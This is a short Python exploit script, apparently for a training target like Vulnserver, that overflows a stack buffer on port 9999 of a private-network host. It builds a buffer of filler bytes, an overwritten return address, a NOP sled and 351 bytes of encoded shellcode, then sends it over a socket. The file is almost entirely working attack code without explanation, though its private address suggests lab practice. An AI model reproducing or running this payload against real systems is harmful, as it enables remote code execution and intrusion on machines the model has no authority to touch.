#!/usr/bin/python
     
import sys, socket
#625011af
#shellcode = "A" * 2003 
#shellcode+="\xaf\x11\x50\x62"

#overflow payload size is 351 bytes 
overflow = ( "\xba\x43\xe2\x81\x14\xdb\xd1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x55\x12\x03\x55\x12\x83\x86\xe6\x63\xe1\xf4\x0f\xe1"
"\x0a\x04\xd0\x86\x83\xe1\xe1\x86\xf0\x62\x51\x37\x72\x26\x5e"
"\xbc\xd6\xd2\xd5\xb0\xfe\xd5\x5e\x7e\xd9\xd8\x5f\xd3\x19\x7b"
"\xdc\x2e\x4e\x5b\xdd\xe0\x83\x9a\x1a\x1c\x69\xce\xf3\x6a\xdc"
"\xfe\x70\x26\xdd\x75\xca\xa6\x65\x6a\x9b\xc9\x44\x3d\x97\x93"
"\x46\xbc\x74\xa8\xce\xa6\x99\x95\x99\x5d\x69\x61\x18\xb7\xa3"
"\x8a\xb7\xf6\x0b\x79\xc9\x3f\xab\x62\xbc\x49\xcf\x1f\xc7\x8e"
"\xad\xfb\x42\x14\x15\x8f\xf5\xf0\xa7\x5c\x63\x73\xab\x29\xe7"
"\xdb\xa8\xac\x24\x50\xd4\x25\xcb\xb6\x5c\x7d\xe8\x12\x04\x25"
"\x91\x03\xe0\x88\xae\x53\x4b\x74\x0b\x18\x66\x61\x26\x43\xef"
"\x46\x0b\x7b\xef\xc0\x1c\x08\xdd\x4f\xb7\x86\x6d\x07\x11\x51"
"\x91\x32\xe5\xcd\x6c\xbd\x16\xc4\xaa\xe9\x46\x7e\x1a\x92\x0c"
"\x7e\xa3\x47\x82\x2e\x0b\x38\x63\x9e\xeb\xe8\x0b\xf4\xe3\xd7"
"\x2c\xf7\x29\x70\xc6\x02\xba\xbf\xbf\x0d\x3d\x28\xc2\x0d\x50"
"\xf4\x4b\xeb\x38\x14\x1a\xa4\xd4\x8d\x07\x3e\x44\x51\x92\x3b"
"\x46\xd9\x11\xbc\x09\x2a\x5f\xae\xfe\xda\x2a\x8c\xa9\xe5\x80"
"\xb8\x36\x77\x4f\x38\x30\x64\xd8\x6f\x15\x5a\x11\xe5\x8b\xc5"
"\x8b\x1b\x56\x93\xf4\x9f\x8d\x60\xfa\x1e\x43\xdc\xd8\x30\x9d"
"\xdd\x64\x64\x71\x88\x32\xd2\x37\x62\xf5\x8c\xe1\xd9\x5f\x58"
"\x77\x12\x60\x1e\x78\x7f\x16\xfe\xc9\xd6\x6f\x01\xe5\xbe\x67"
"\x7a\x1b\x5f\x87\x51\x9f\x7f\x6a\x73\xea\x17\x33\x16\x57\x7a"
"\xc4\xcd\x94\x83\x47\xe7\x64\x70\x57\x82\x61\x3c\xdf\x7f\x18"
"\x2d\x8a\x7f\x8f\x4e\x9f" )

#payload = "TRUN /.:/" + shellcode + "\x90" * 32 + overflow
payload = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

#print (payload)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.6',9999))
    print ("[+] Sending the payload...\n" + str(len(payload)))
    #s.send((payload.encode()))
    s.send(payload)
    s.close()
except:
    #print ("The fuzzing crashed at %s bytes" % str(len(payload)))
    print("Error connecting to server")
    sys.exit()